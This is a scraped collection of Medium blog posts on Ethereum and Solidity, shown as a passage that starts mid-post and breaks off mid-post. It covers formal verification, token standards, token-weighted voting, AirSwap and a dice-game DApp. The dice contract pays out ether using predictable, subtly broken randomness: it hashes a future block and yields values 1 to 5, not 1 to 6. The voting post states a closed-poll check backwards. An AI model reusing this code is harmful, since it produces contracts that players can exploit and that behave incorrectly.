examples/token/out/specs.To reproduce the above step you need to have klab installed. (A detailed tutorial for this is at klab GitHub)3. Run the machinery. KLAB uses a client-server architecture, so you need to run two processes (same as above, klab must be installed):Server:Client:(it may take a while: on my MacBookAir it took ~10 minutes)Please note, that \u2014 in step 2 \u2014 the description compiled into two different K statements (i.e. one statement describes the case when iff section holds and the other \u2014 when it fails). So, to verify our semantics, these K statements have to both pass. That is also why the client above runs two tests, one after the other.So: what have we just proved?If both above K statements passed the klab verification, it means that the considerate code really behaves exactly as described in our semantics. Well, a precisian would add: unless there is a bug in underneath KEVM description of EVM, or there is a bug in K-framework itself ;)What next?Homework recommendation :)1. Try to spoil the implementation (for example remove safe math operations) and re-run the proving process to make sure that the proof will fail.2. Try to write a high-level semantics for the same function, but for the not-yet-covered case, i.e. CALLER_ID == To and verify if it is consistent with the actual code.3. See https://github.com/dapphub/fv-tutorial.git \u2014 a great set of tasks prepared by dapphub for Devcon4 workshop. Here the problem is reversed to the above problem 1. Given implementations and specifications that do not agree with each other, try to fix it.AcknowledgmentsThanks to Tomasz Kazana for his support and contribution to this post.", "responses": 1, "tags": ["Ethereum", "Klab", "Formal Verification", "Solidity", "Evm"]}, {"title": "ETHBerlin and state of the crypto ecosystem", "post_link": "https://medium.com/@sgershuni/ethberlin-and-state-of-the-crypto-ecosystem-7e2bd05e04b2?source=search_post", "author_name": "Stepan Gershuni", "author_link": "https://medium.com/@sgershuni", "publish_date": "2018-09-12", "last_modified_date": "2018-09-12", "readtime": "2.47", "claps": 261, "voters": 22, "content": "ETHBerlin and state of the crypto ecosystemStepan GershuniFollowSep 12, 2018 \u00b7 3 min readGuten morgen from Berlin. It\u2019s been a fantastic week with some of the most energetic and insightful people from crypto industry.Our teamWe flew in from Moscow with the whole Mixbytes team, split up and managed to finish three distinct projects:Token Curated RatingSolidity implementation of the algorithm that allows to curate a rating of items with staking ether or tokens. The model is resilient to large stake attacks and bots, whereas most modern DPoS algorithms are not. In the end we had over 600 lines of Solidity codes, completely written from scratch and I think even judges couldn\u2019t believe we managed to do this much work (plus beautiful frontend during the hackathon).Ring Signatures based anonymous votingAnother team was focusing on bringing BN256 elliptic curve into Ethereum via smart contract and implement anonymous voting based on that.Apache Parquet implementation for EthereumOur CTO single-handedly was working on creating a column-based database for Ethereum which allows for up to 3x data compression and fee reduction.Organization and hackathon space was fantastic! We\u2019re definitely looking forward to repeating this experience again.In addition, here\u2019s an unordered list of my personal insights and just general understanding of the crypto space right now:Public ICOs are finally dyingIt was never a news for anyone with enough experience from traditional VC industry that ICO craze of 2017 is not going to end well. Finally the market in general is getting to this rational conclusion that 100x in one month times are over. Private rounds with more or less mature legal frameworks around those deals are finally starting to dominate the market.The only two projects in crypto that are currently working are Bitcoin and EthereumEverything else, even though does have a great potential and really smart ideas inside, still is in too early stages. Great projects have raised some millions of dollars but this does not guarantee success to all of them in any way. Moreover, if you just look at the traction and real usage, all those networks, protocols and apps are basically dead. It does not mean that they can\u2019t become Googles and Amazons of the future, but this is definitely not happening in one year.Crypto keeps attracting most brightest and brilliant developersAll of those billions of dollars raised plus a constant inflow of motivated, inspired and brilliant developers just cannot result in anything else than awesome technology. The trick is that we don\u2019t know yet which of those technologies will be actually used by regular users. Unless it\u2019s as easy for new users as status quo OR unless it solves some of their desperate needs, dApps and blockchains won\u2019t be used by millions of users.Solidity development ecosystem is not ready yetEven though smart contracts is a very powerful idea, Solidity still lack some of the fundamental development tools. It often takes hours of debugging with no ability to actually trace smart contract execution.Keep buidling and see you on the plains of decentralized web!", "responses": 1, "tags": ["Blockchain", "Ethereum", "Dapps", "Hackathons", "Solidity"]}, {"title": "Token-weighted voting implementation Part 3", "post_link": "https://medium.com/colony/token-weighted-voting-implementation-part-3-821dde0a674b?source=search_post", "author_name": "Elena Dimitrova", "author_link": "https://medium.com/@elena_di", "publish_date": "2016-11-11", "last_modified_date": "2018-05-21", "readtime": "2.99", "claps": 195, "voters": 19, "content": "Token-weighted voting implementation Part 3Token LockingElena DimitrovaFollowNov 11, 2016 \u00b7 3 min readThis is the last of a 3-part article which presents the Solidity-based implementation of the Token weighted voting protocol.In part 2 of this article we concluded by defining the isAddressLocked function in our VotingLibrary which is key to the implementation of the token locking logic we focus on here. Further on, we define the algorithm of revealing and counting secret votes as well as token unlocking.Token lockingOur token contract implementation is based on the ERC #20 standard where there are two functions that enable token transfers: transfer and transferFrom. To enable token locking, we extend these functions with the following logic:Token locking logicOnce transfer is called, we first establish whether the sender or recipient addresses are locked via the isAddressLocked function in our Voting contract, described in part 2 of this article.In the case when the sender is locked, we fail the transfer. If however the recipient is locked, we hold the transfer amount in an onHoldBalance. After the user reveals their vote, thus unlocking their tokens, that onHoldBalance is transferred to their available balance. The held balance \u2018read\u2019, \u2018write\u2019 and \u2018transfer to balance\u2019 functions are defined as follows:The gas cost changes resulting from the additional checks we introduced, show transfer function gas cost has increased only by ~4,500 gas (measured at 53559 before, 58146 after) or roughly 8.5%.Reveal vote transactionThis algorithm requires users to always reveal their votes, even if the reveal period has expired. When the pollCloseTime is reached, every user who had voted in that particular poll has their tokens locked, essentially the isAddressLocked function called for their address returns true. This entails that all token transfer calls they make, as per above, will fail and any transfers tokens they receive, will be put on hold. This is mitigated by the fact that a user can unlock their tokens immediately after the poll closes by revealing their vote. This revealVote transaction is detailed below.Reveal vote logicThis is token-weighted voting, so firstly we retrieve the user token balance as this affects how we count the vote .Secondly we validate the state by checking that the poll has closed and the vote secret is the same as the one submitted when the user voted. This is done by comparing the saved secret to the hash of the salt and pollOptionId the user has voted on. For details of generating the secret vote, see Secret voting in part 2 of this article.Once the vote is revealed and validated, we determine whether to count it in the final poll results. This is determined again by the poll status property, which if resolved, means the admin has taken the final poll results and counting votes is over. Otherwise, the votes on the decision are incremented appropriately based on the current balance of the revealing user which we had already retrieved in the first part of this transaction. For example, if a user A with 1200 tokens had voted for option X, then the total count of poll option X is increased by 1200 once user A submits their revealVote transaction (and before the poll is resolved).We then continue to unlock the user account for token transfers and any tokens that have been on hold are transferred to their standard available balance. Note that tokens are only released once no unrevealed votes remain. As it could be the case that there are other votes left to be revealed, in which case the current revealVote transaction doesn\u2019t unlock the account.Devcon2This implementation was presented at Devcon2 (which is where the featured photos of the Shanghai skyline are from, in case you wonder about the connection between China and democratic voting protocols).The recording from our presentation there gives a good high level overview of the theory and practice of this implementation.", "responses": 3, "tags": ["Blockchain", "Ethereum", "Solidity", "Dao"]}, {"title": "Ethereum Token Standards", "post_link": "https://blog.chronobank.io/ethereum-token-standards-19fbcc54fe27?source=search_post", "author_name": "ChronoBank.io", "author_link": "https://blog.chronobank.io/@ChronoBank", "publish_date": "2018-04-26", "last_modified_date": "2018-07-01", "readtime": "3.2", "claps": 270, "voters": 22, "content": "Ethereum Token StandardsThere are many different possible ways of creating and structuring a token. What is ERC, ERC 20, ERC 721, ERC 884 and more.ChronoBank.ioFollowApr 26, 2018 \u00b7 4 min read\ud83c\udf0d Read in \ud83c\uddea\ud83c\uddf8 Espa\u00f1ol \ud83c\uddf7\ud83c\uddfa \u0420\u0443\u0441\u0441\u043a\u0438\u0439 \ud83c\udde8\ud83c\uddf3 \u4e2d\u6587 \ud83c\uddf0\ud83c\uddf7 \ud55c\uad6d\uc5b4You might have seen the phrase \u2018ERC-20\u2019 when reading about Ethereum tokens. This refers to a particular standard for tokens, which is the most common and widely-used on the Ethereum platform. This widespread usage is the reason that TIME itself is an ERC-20 token, and why the ChronoWallet supports the same standard (you can create and manage any ERC-20 token using our software). Most exchanges and other wallet platforms support this standard too. However, other standards have been proposed, and there are many different possible ways of creating and structuring a token.What is ERC?ERC stands for Ethereum Request for Comments. This idea is modelled on the Requests for Comments published by the Internet Engineering Task Force (IETF) and the Internet Society (ISOC), which are the main technical development and standards-setting bodies for the internet. An ERC is a type of EIP, or Ethereum Improvement Proposal. Just like the Bitcoin Improvement Proposals (BIPs), only a few of these are actually implemented.ERC stands for Ethereum Request for CommentsTo meet the ERC-20 token standard, an Ethereum token has to include a specific set of functions that means they act and can be used in a certain way. Arguably these are little more than common sense, since without them it would be far more complex to deploy and manage tokens. But codifying these principles allows other applications and smart contracts to interact with ERC-20 tokens in a known, standard and predictable way.ChronoBank\u2019s flagship token, TIME, is an ERC-20 token, and all of the largest ICOs on Ethereum have also released ERC-20 tokens. However, ERC-20 isn\u2019t perfect, and there\u2019s always room for improvement.New standards for tokens are proposed all the time. These are carefully considered by developers and the community. Due to the importance of maintaining compatibility and the disruption of introducing new standards, only a few make it further than the proposal stage, but there are some it\u2019s worth knowing about.ERC-223. This proposal seeks to fix the problem that ERC-20 tokens become stuck when sent to a smart contract that is not intended to work with ERC-20 tokens. Significant funds have been lost when users have accidentally sent tokens to such a contract.ERC-721. Most tokens are \u2018fungible\u2019 \u2014 that is, every token is the same as another. Fungibility is an important principle of monetary supply \u2014 every $10 bill needs to be treated the same (and considered as valuable as) any other, for example. ERC-721 proposes a token standard whereby tokens are not fungible: they are each unique. One of the most well-known implementations of this standard is the CryptoKitties game, which features unique, collectible cats. The Cryptocup World Cup game also uses this feature.ERC-827. ERC-20 tokens allow the transfer of value only. ERC-827 allows the transfer of value and data. Additionally, third parties can approve spending of tokens. The creators of ERC-827 have taken pains to keep their code brief and to maintain full compatibility with ERC-20 tokens.ERC-948. This proposal is designed to connect subscription businesses with consumers. Subscription-model businesses are booming, particularly in sectors such as streaming media (e.g. Netflix). As more and more businesses start to use the blockchain, it will be important to support subscriptions on Ethereum and other platforms. Doing so under the ERC-20 standard would be complex and entail unnecessary frictions for the consumer.ERC-884. Following a recent Bill, Delaware General Corporation Law now explicitly allows for the use of blockchains in maintaining corporate share registries. ERC-884 is designed to represent equity issued by any Delaware corporation, whether private or public, and includes several provisions over and above ERC-20 that support this use case. These include the requirement for token owners to be whitelisted/identity verified as an integral part of the token.These are just some of the many proposals for Ethereum token standards. The beauty of a decentralised system is that anyone can make an improvement proposal and have it considered by the community.Show us your \u2764\ufe0f with clicking \u201c\ud83d\udc4f\u201d on the left side of the screen. The number of claps indicates how much you liked the post and support its content, so put those hands together as many times as you like.For all latest updates:\u261e Follow us on Twitter and Facebook\u261e Join us in TelegramQuestions? Email us at support@chronobank.ioComments? Email us at info@chronobank.ioTIME is trading on the following exchanges:https://coinmarketcap.com/assets/chronobank/#markets", "responses": 1, "tags": ["Blockchain", "Token", "Solidity", "Blockchain Development", "Cryptocurrency"]}, {"title": "State Channels for Babies Pt. 1", "post_link": "https://medium.com/@BlockChannel/state-channels-for-babies-50ec876f755b?source=search_post", "author_name": "BlockChannel", "author_link": "https://medium.com/@BlockChannel", "publish_date": "2018-07-26", "last_modified_date": "2018-07-26", "readtime": "2.28", "claps": 309, "voters": 21, "content": "State Channels for Babies Pt. 1Helping Blockchains Take Their First StepsBlockChannelFollowJul 26, 2018 \u00b7 3 min readCross-Post: This post was originally written by Hunter Hillman, and was republished from the Connext blog with their explicit permission.Baby Learns to Walk (& Scale)After our introduction to blockchains, Blockchains for Babies, we\u2019re proud to present the next installment in the series! There are many developers working very hard on scaling solutions that are essential for the mainstream adoption of blockchain-based technologies. But a lot of terms get thrown around \u2014 Sharding, Plasma, State Channels, Sidechains \u2014 but what does it all mean?In this installment, we\u2019re going to take a dive into what state channels are and how they can make blockchains more practical for everyone by assisting with scalability. This chapter relies on terms and concepts from the original #blockchainsforbabies, so if you haven\u2019t read it yet check it out here!Now, without further ado, we present:", "responses": 1, "tags": ["Blockchain", "Solidity", "Ethereum", "Scalability", "State Channels"]}, {"title": "New AirSwap Protocols", "post_link": "https://medium.com/fluidity/new-airswap-protocols-c70c73f58477?source=search_post", "author_name": "AirSwap Team", "author_link": "https://medium.com/@airswap", "publish_date": "2019-08-08", "last_modified_date": "2019-08-08", "readtime": "3.30", "claps": 910, "voters": 22, "content": "New AirSwap ProtocolsAirSwap TeamFollowAug 8 \u00b7 4 min readDecentralized trade starts with an atomic swap. Today, we\u2019re publishing new protocols including on-chain peer discovery and delegation, enabling even more powerful applications and integrations throughout decentralized finance.Traders on AirSwap continue to use the original Swap contract deployed years ago. It does one job well: to swap tokens and ether. Immutable like any smart contract, it will continue to support applications that fit.Setting a courseSince then, we\u2019ve seen both needs and opportunities to expand its capabilities and deploy new protocol elements as smart contracts. Already, the components of trade \u2014 custody, execution, and settlement \u2014 are decentralized through a peer-to-peer design, our founding principle.Our goal is to take flight \u2014 to become open, transparent, and immutable. Combined with an overall aim to bolster liquidity through both online and onchain peers, our goal to take flight also includes more open source development and decentralized indexing capabilities.New features for SwapWe\u2019ve maintained the same simplicity that makes the Swap Protocol elegant. We\u2019ve added support for more token and signature types, improved efficiency, and added two powerful new features: affiliates and authorizations.Token types include ERC-20 and ERC-721 (NFT) with a path to supporting more standards over time. Signature types include both standard and ERC-712 (typed) for improved wallet usability and transparency. All signatures are now more secure by implementing EIP-191.Affiliates are third-parties compensated for their part in bringing together two parties making a trade. These come into play if a transaction is facilitated by a third-party or a software application helps to connect its users to other traders on the network.Authorizations are for peers that trade on behalf of others. These peers are authorized for either side of a trade, and can be wallets (people or programs) or smart contracts, opening a new world of integration possibilities.See the Swap source code on GitHub. It\u2019s in production.We take quality and security seriously. We maintain unit and integration tests for full coverage, and have performed an internal audit by our team at Fluidity with the support of researcher and advisor Phil Daian.See the Swap Security Report on GitHub.New decentralized indexersWe envision a future of many indexers, supporting makers of many kinds. An indexer employs a token for staking, a necessary utility to give makers an opportunity to be among the first returned when the indexer is queried.For example, an application like AirSwap Instant may be interested in querying a maximum of 20 prospective makers at a time. By staking variable amounts of AirSwap Token, makers can ensure that they are included among those results and able to provide that liquidity.In the future, an indexer could be deployed for IPFS hashes that resolve to arbitrary URLs for makers that live around the web at various endpoints speaking various protocols. We think the new indexer design both fits this wide open future and matches our original vision well.See the Indexer source code on GitHub. Work in progress.New onchain liquidityThe authorization feature enables traders to deploy smart contracts that implement the Peer Protocol and trade on their behalf. The simplest form of this is rules that effectively provide limit orders and partial fills. Others can include arbitrary logic and integrations with other liquidity sources.See the Peer example on GitHub. For demonstration only.The AirSwap network today, comprised of automated makers and trading desks, does a great job covering higher liquidity assets and large over-the-counter trades. Onchain liquidity now lets everyday people and token teams participate without having to run online maker software.In combination with existing automated makers and trading desks, we think this solution fills the long tail of liquidity completes the picture.Active open source developmentToday we\u2019ve published our complete protocols repository for review and contribution. You\u2019ll find our team there \u2014 Deepa Sathaye, Ethan Wessel, Alice Henshaw, and Don Mosites\u2014 actively developing new features and performing ongoing security and performance analysis. We welcome your thoughts and contributions and look forward to continued growth as we pursue an immutable and transparent future.Coming up nextThis week, we released AirSwap Trader using the new Swap contract in production. Our upcoming goals are to complete and deploy a new indexer for AirSwap Instant, and then to complete the onchain peer system.We\u2019ll soon publish a bug bounty for the Swap contract so stay tuned. To discuss the new AirSwap Protocols repository and roadmap, please join our team on the new AirSwap server on Discord. We\u2019re looking forward to it.More about AirSwapSubscribe to the Fluidity BlogRequest and upvote new features on AirSwapCatch up on AirSwap product updatesFollow AirSwap on Facebook, Twitter, LinkedIn, Instagram, and YouTubeVisit our AirSwap Developer Tools for the latest AirSwap tutorials, docs, and updatesJoin us on our Telegram and our Developers DiscordSubscribe to AirSwap\u2019s subreddit", "responses": 0, "tags": ["Blockchain", "Airswap", "Ethereum", "Open Source", "Solidity"]}, {"title": "Building A Dice Game DApp On The Ethereum Blockchain", "post_link": "https://medium.com/crowdbotics/building-a-dice-game-dapp-on-the-ethereum-blockchain-7c6ba17f30ba?source=search_post", "author_name": "Gaurav Agrawal", "author_link": "https://medium.com/@gaurav.agrawal", "publish_date": "2018-11-19", "last_modified_date": "2019-06-13", "readtime": "7.18", "claps": 197, "voters": 21, "content": "Building A Dice Game DApp On The Ethereum BlockchainExploring interesting use cases for the Ethereum blockchain by building a simple dice roll DApp game with Truffle Framework.Gaurav AgrawalFollowNov 19, 2018 \u00b7 8 min read\u2018DApp\u2019 is an abbreviation for Decentralized app. DApps are a new paradigm for building apps where a back end centralized server is replaced by a decentralized peer to peer network.Industry-wide, we\u2019re just beginning to scratch the surface of potential blockchain use cases. Most people associate \u2018blockchain\u2019 with \u2018cryptocurrencies,\u2019 but new use cases for blockchain technology are emerging everyday.Today, I\u2019ll show you how to build a simple dice game with Ethereum as a means to explore different and interesting uses cases for blockchain technology.What is an Ethereum DApp?Ethereum DApps build on Ethereum blockchain technology, where Ethereum serves as the backend for the application.One of the most popular DApps, cryptokitties, is collectibles-style game built on Ethereum. When we build a game with Ethereum, essentially, each game action and transaction is stored on the Ethereum blockchain.Roll the Dice DAppLet\u2019s create a simple dice roll game.\u2018Player\u2019 will roll the dice and chance to win 0.00001 ether. \u2018Target\u2019 will be set between 1 to 6.You can try our Roll the Dice here. Note: Game is deployed on Rinkeby network only.Now let\u2019s dive into the code.How To Play The GameClick on \u201cGet new bet\u201d to get the target.Next, roll the Dice by clicking \u201cRoll it\u201d.If you get the same number, 0.00001 ether will be transfer to your account.PrerequisiteUnderstanding of NodejsBasic understanding of Smart contractTruffle frameworkUnderstanding of Html and JavascriptMetamask walletDice smart contractOur Dice.sol smart contract will control the core logic for our game. Let\u2019s have a look at the code:struct Bet{  uint8  currentBet; // this is target  bool  isBetSet; //default value is false   uint8  destiny; //  }mapping(address => Bet) private bets;uint8 private randomFactor;We will define Bet structure as having 3 variables:currentBet : This is used to set a new bet.isBetSet : To check if the bet is set or not?destiny : Contains the number when you roll the dice.We will also create mapping which will track the bets of players, and add a randomFactor, which will be used to randomize our results.Events: We have 2 events, one will emit when the bet is set for a player and other is for the game result. Events help in conveying state change on the frontend.event NewBetIsSet(address bidder , uint8 currentBet);event GameResult(address bidder, uint8 currentBet , uint8 destiny);Getting a new betTo take a bet from a new player, we will perform the following steps:Check if a bet is already set for the playerMark the bet as set nowGet the random number and set the current betEmit \u2018 NewBetIsSet\u2019 event and return the current betfunction getNewbet() public returns(uint8){  require(bets[msg.sender].isBetSet == false);  bets[msg.sender].isBetSet = true;  bets[msg.sender].currentBet = random();  randomFactor += bets[msg.sender].currentBet;  emit NewBetIsSet(msg.sender, bets[msg.sender].currentBet);  return bets[msg.sender].currentBet; }Rolling the DiceNext, we will roll the dice. For this, we will perform the following steps:Check if a bet is set for the playerGet the random number and set the destinyMark the isBetSet variable falseCheck if currentbet and destiny is equal, if yes transfer the prize(0.00001 ether) to the player and emit the GameResult event.Else only emit the GameResult event if currentBet and destiny is not equal.function roll() public returns(address , uint8 , uint8){  require(bets[msg.sender].isBetSet == true);  bets[msg.sender].destiny = random();  randomFactor += bets[msg.sender].destiny;  bets[msg.sender].isBetSet = false;  if(bets[msg.sender].destiny == bets[msg.sender].currentBet){   msg.sender.transfer(100000000000000);   emit GameResult(msg.sender, bets[msg.sender].currentBet, bets[msg.sender].destiny);     }else{   emit GameResult(msg.sender, bets[msg.sender].currentBet, bets[msg.sender].destiny);  }  return (msg.sender , bets[msg.sender].currentBet , bets[msg.sender].destiny); }We are adding destiny and currentBet to our randomFactor every time. This helps us randomize our bets efficiently.Other than above core functions, we have an isBetSet function to tell if the bet is set for a player and a random function to get random numbers for our dice.function isBetSet() public view returns(bool){  return bets[msg.sender].isBetSet; }function random() private view returns (uint8) { uint256 blockValue = uint256(blockhash(block.number-1 +    block.timestamp));        blockValue = blockValue + uint256(randomFactor);        return uint8(blockValue % 5) + 1; }Fallback Function: We will also add a fallback function. This function is executed if a contract is called and no other function matches the specified function identifier, or if no data is supplied. These functions are also executed whenever a contract would receive plain Ether, without any data.function() public payable{}Note: You should test your smart contract. You can learn more about testing smart contracts in some of our previous tutorials.Truffle frameworkWe will use Truffle framework to develop our DApp. Truffle has prebuilt packages which they call boxes. Truffle boxes help in getting the boilerplate code to develop a DApp. You can check more about truffle boxes here. We will use basic pet-box which will give us the boilerplate code for Dice game DApp. You can learn more about truffle pet-box here.Let\u2019s walk through app.js and understand what's happening on the frontend.We will define our app variable and declare variables we will use throughout app.js.We will also add an \u2018init\u2019 function in which will initialize web3 provider. Web3 provider allows your application to communicate with an Ethereum Node.MetaMask, an ethereum chrome extension wallet, will inject web3.js. Here, we will see if any web3 provider already exists. If not, it will try to connect a local blockchain. For testing purposes, we will run ganache on our local machine and connect to it.App = {  web3Provider: null,  contracts: {},  account: '0x0',  hasVoted: false,init: function() {    return App.initWeb3();  },initWeb3: function() {    if (typeof web3 !== 'undefined') {      // If a web3 instance is already provided by Meta Mask.      App.web3Provider = web3.currentProvider;      web3 = new Web3(web3.currentProvider);    } else {      App.web3Provider = new Web3.providers.HttpProvider('http://localhost:8545');      web3 = new Web3(App.web3Provider);    }    return App.initContract();  },Getting Dice ContractTruffle petbox gives us truffle-contract.js which gives us the boilerplate code to interact with the contract. We use ABI (Application Programming Interface), a JSON representation of our contractl to interact with our contract on the frontend.If we don\u2019t use truffle we manually need to change this ABI every time when change and compile our contract. Whenever you compile a solidity smart contract, it will generate a JSON file. This JSON file is ABI to interact with the smart contract.initContract: function() {    $.getJSON(\"Dice.json\", function(dice) {      // Instantiate a new truffle contract from the artifact      App.contracts.Dice = TruffleContract(dice);      // Connect provider to interact with contract      App.contracts.Dice.setProvider(App.web3Provider);App.listenForEvents();return App.render();    });  },We now get the Dice.json file, which is JSON representation of our smart contract. We initiate our Dice contract and set the web3.provider. truffle-contract.js are helping us here by providing TruffleContract function. You can check Dice.json and truffle-contract.js for more details.Listening EventsEvents are a crucial part of any DApp.Asynchronous and blockchain transactions take time. Events help us in tracking the status inside the DApp.We will change our interface to show changes to users. We are listening to both events GameResult and NewBetIsSet and passing event object to render UI accordingly.listenForEvents: function() {    App.contracts.Dice.deployed().then(function(instance) {      instance.GameResult({}, {}).watch(function(error, event) {        console.log(\"event triggered\", event)        // Reload when a new vote is recorded        App.render(event);      });    instance.NewBetIsSet({}, {}).watch(function(error, event) {        console.log(\"event triggered\", event)        // Reload when a new vote is recorded        App.render(event);      });});  },Check render method. We are checking events and showing results to users accordingly and also we are calling isBetSet method to know if a bet is set for a user or not.render: function(event) {    var gameInstance;    // Load account data    web3.eth.getCoinbase(function(err, account) {      if (err === null) {        App.account = account;        $(\"#accountAddress\").html(\"Your Account : \" + account );      }    });if(event.event == \"NewBetIsSet\"){    $(\"#newBet\")      .text(\"Your target is : \" + event.args.currentBet.toNumber());    }if(event.event == \"GameResult\") {        var destiny = event.args.destiny.toNumber();      var currentBet = event.args.currentBet.toNumber();      var doWeHaveAWinner = (destiny == currentBet);      if(doWeHaveAWinner){          $(\"#result\").text(\"we have a winner\");      }else{          $(\"#result\").text(\"Sorry bad luck, your got \" + destiny);      }    }// Load contract data    App.contracts.Dice.deployed().then(function(instance) {      gameInstance = instance;      return gameInstance.isBetSet();    }).then(function(isBetSet) {      var message = $(\"#message\");      if(isBetSet){        message.text('Bet is Set, Roll the Dice')      }else{      message.text('Set New Bet');    }    }).catch(function(error) {      console.warn(error);    });  }Also, we are defining roll and getNewBet method which we are calling from index.html on button clicks.roll : function(){    App.contracts.Dice.deployed().then(function(instance) {      return instance.roll({ from: App.account });    }).then(function(result) {    }).catch(function(err) {      console.error(err);    });  },getNewBet: function() {    $(\"#result\").text(\"\");    App.contracts.Dice.deployed().then(function(instance) {      return instance.getNewbet({ from: App.account });    }).then(function(result) {       }).catch(function(err) {      console.error(err);    });  }Deploying our DappWe will use ganache for deploying our DApp locally. If you don\u2019t have ganache, you can download it here. Run the commands below to deploy our contracts.truffle compiletruffle migrate --resetThis will deploy our smart contract to interact with the smart contract you can use truffle console command.Full codeYou can see full code for our dice game here.You can play around with the live DApp here.ImprovementThere are a lot of improvements which can be made to our Dice apart from UI.Here are a few suggested improvements which you add to your version of the Game.Optimize the memory. There is no need to story destiny, you can remove that.Optimize the amount of Gas we are using.Add a withdraw function to take out the extra ether from the contract.Make random function better. Generating random numbers on blockchains are itself a challenge as everything on blockchain is public.Improve the UI. Make it roll \ud83d\ude03ConclusionDApps are a new paradigm to for building applications on the internet, and we\u2019re just scratching the surface. Instead of hosting an app on Heroku, we can host our app on IPFS (decentralize peer to peer file system).DApps decentralize the way we interact on the internet. DApps run on decentralized networks, in our case Ethereum blockchain, but not every DApp needs to be built with a blockchain.In the future, you will see more Dapps with awesome UX and better use cases. Now\u2019s the time to explore!Building A Web Or Mobile App?Crowdbotics is the fastest way to build, launch and scale an application.Developer? Try out the Crowdbotics App Builder to quickly scaffold and deploy apps with a variety of popular frameworks.Busy or non-technical? Join hundreds of happy teams building software with Crowdbotics PMs and expert developers. Scope timeline and cost with Crowdbotics Managed App Development for free.", "responses": 0, "tags": ["Ethereum", "Dapps", "Solidity", "Programming", "Blockchain Technology"]}, {"title": "Token-weighted voting implementation Part 1", "post_link": "https://medium.com/colony/token-weighted-voting-implementation-part-1-72f836b5423b?source=search_post", "author_name": "Elena Dimitrova", "author_link": "https://medium.com/@elena_di", "publish_date": "2016-09-19", "last_modified_date": "2018-06-04", "readtime": "3.14", "claps": 109, "voters": 27, "content": "Token-weighted voting implementation Part 1Poll LifecycleElena DimitrovaFollowSep 19, 2016 \u00b7 4 min readThis is the first of a 3-part article which presents the Solidity-based implementation of the Token weighted voting protocol. I am presenting the end-to-end implementation overview of this at DevCon2 and these 3 articles aim to go into the detail of this. Here, we examine the lifecycle of a poll and its data structure.High-level contract designBefore we go into the implementation details, it\u2019s necessary to understand the Colony contract design at a high level.The Colony contract itself serves as the interface to the user.The library layer encapsulates the business logic for different domains, e.g. TokenLibrary contains the logic for managing Colony tokens, Voting library contains the poll and votes management logic etc. The Security and Task library in the diagram below are greyed out as they\u2019re not directly relevant in the context of this article but they form an integral part of the Colony network.While we use libraries to encapsulate business logic, we use a generic storage contract to persist Colony data, e.g. storing information about the token balances, polls and votes etc.This contracts design is established following our chosen approach for writing upgradable contracts.Colony high level contract designIn this first article on poll management, all functionality is encapsulated into the Voting Library implementation.Poll data structureSimilar to the traditional sense of what makes up a poll, we have implemented the following properties:description \u2014 contains the poll question itself, e.g. \u201cShould Scotland be an independent country?\u201dpoll options \u2014 there should be a minimum of 2 options for each poll, e.g. \u201cYes\u201d, \u201cNo\u201dstart time \u2014 the point in time when the poll opens for votingclose time \u2014 the point in time when the poll closes for votingpoll status \u2014 a poll goes through the stages of being created, active (open for votes or revealing votes) and resolvedThese are implemented as bytes32 key mappings to their respective EterenalStorage-supported types.bytes32 Key                                  Mapped value typesha3(\"Poll\", pollId, \"description\")         => stringsha3(\"Poll\", pollId, \"option\", idx)         => stringsha3(\"Poll\", pollId, \"startTime\")           => uint256sha3(\"Poll\", pollId, \"closeTime\")           => uint256sha3(\"Poll\", pollId, \"status\")              => uint256In addition, there are two global properties we maintain for the purpose of enumerating through polls and poll options. We keep a count of polls and poll options and never delete them. Thus we maintain a \u201cpoll count\u201d global property which helps us keep track of this and used to generate the ID of the next item when it\u2019s created.bytes32 Key                                  Mapped value typesha3(\"PollCount\")                           => uint256sha3(\"Poll\", pollId, \"OptionsCount\")        => uint256Poll LifecyclePolls can be managed by admins only and their lifecycle is a one-way staged process as follows:Poll LifecycleTo ensure the stages are sequential, we make use of a modifier to ensure the poll is currently with the correct status.modifier ensurePollStatus(uint256 pollId, uint256 pollStatus){   var currentStatus = getUIntValue(sha3(\u201cPoll\u201d, pollId, \u201cstatus\u201d));   if (pollStatus != currentStatus) { throw; }   _}The following poll management functions have been implemented in our Voting library, which set the required properties outlined above, i.e. description, poll option, open and close times and status:function createPoll(string description) {...}function addPollOption(uint256 pollId, string pollOptionDescription)  ensurePollStatus(pollId, 0)  returns (bool) {...}function openPoll(uint256 pollId, uint256 pollDuration)  ensurePollStatus(pollId, 0)  returns (bool) {...}function resolvePoll(address _storageContract, uint256 pollId)  ensurePollStatus(pollId, 1)  returns (bool) {...}Let\u2019s run through a sample call sequence for this:colony.createPoll(\"Should the United Kingdom remain a member of the EU?\");colony.addPollOption(1, \"Yes\");colony.addPollOption(1, \"No\");colony.openPoll(1, 24);// forward time past the poll close timecolony.resolvePoll(1);Poll close timeThere is an additional status of poll closed which gets determined by the poll closeTime property, i.e.if (closeTime > now) => Poll is closedThis is set in the openPoll function as:now + pollDuration * 1 hoursPoll duration is set in hours as the lowest denominator for poll duration time, however you can easily adjust that to minutes, seconds, days etc.Poll VotingIn the second article we will examine the Secret Voting implementation and the double linked lists data structures we use to manage these.", "responses": 0, "tags": ["Ethereum", "Blockchain", "Solidity", "Dao"]}, {"title": "Scaling Crypto User Experience", "post_link": "https://medium.com/hackernoon/scaling-crypto-user-experience-c7d5280eb477?source=search_post", "author_name": "Ronald Mannak", "author_link": "https://medium.com/@ronaldmannak_1825", "publish_date": "2018-09-11", "last_modified_date": "2019-05-24", "readtime": "4.43", "claps": 188, "voters": 20, "content": "Scaling Crypto User ExperienceRonald MannakFollowSep 11, 2018 \u00b7 5 min readHow many people you know have installed and set up a wallet and are using crypto on a regular basis? Depending on how you count, it seems unlikely that the current crypto users represent more than 1% of the total addressable market.A current low adoption rate might indicate the enormous growth potential of crypto. Just imagine what 10x more users \u2014which is still only 10% of the addressable market\u2014 could mean. On the other hand, there is a possibility we will never get to 10%. Promising technology has failed before, as Varun Mathur correctly states in this tweetstorm.Crypto challengesWhat is holding back a broader adoption of crypto? I see three main issues that haven\u2019t been solved yet:Scalability (How many concurrent users or transactions can the system handle?)Utility (What can I use it for?)User-Experience (How easy is it to use?)The smartest minds in the industry are currently working on scaling blockchain technology. Once scaling is solved, utility will be the next area of focus. For utility to increase, a good user-experience is imperative.In terms of where energy and money is spent on, user-experience seems to be underrepresented at the moment. Current tools and apps took us from 0 to 1%, but the next 10% users might not be willing (or able) to figure out the often confusing interfaces.Start with customer experience?Steve Jobs once said: \u201cyou\u2019ve got to start with the customer experience, and work backwards to the technology\u201d. Unfortunately, crypto doesn\u2019t have that luxury. Crypto wasn\u2019t built with a great user-experience in 